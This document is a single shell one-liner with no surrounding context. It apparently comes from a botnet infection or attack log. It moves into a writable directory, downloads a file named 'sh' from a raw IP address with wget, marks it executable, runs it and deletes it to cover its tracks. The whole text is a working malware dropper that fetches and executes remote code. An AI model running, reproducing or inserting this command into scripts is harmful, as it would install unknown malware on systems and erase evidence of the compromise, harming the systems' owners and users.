cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.156.226.54/sh; chmod +x sh; ./sh; rm -rf sh
